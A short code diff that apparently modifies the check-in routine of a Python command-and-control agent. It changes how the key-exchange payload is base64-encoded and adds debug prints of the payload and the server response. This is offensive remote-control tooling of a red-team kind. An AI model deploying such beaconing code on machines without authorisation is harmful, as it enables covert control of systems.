@@ -163,10 +163,14 @@ CRYPTO_MODULE_PLACEHOLDER
             "action": "key_exchange",
             "uuid": self.agent_config["PayloadUUID"]
         }
-        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + json.dumps(initial_payload).encode())
-        
+        encoded_data = base64.b64encode(json.dumps(initial_payload).encode())
+        print(f"[DEBUG] Performing check-in with payload: {initial_payload}")
+        print(f"[DEBUG] Performing check-in with encoded data: {encoded_data}")
+
         response = self.makeRequest(encoded_data, method='POST')
+        print(f"[DEBUG] Check-in response: {response}")
         if not response:
+            print("[DEBUG] Check-in failed: No response received")
             return False
         
         try:
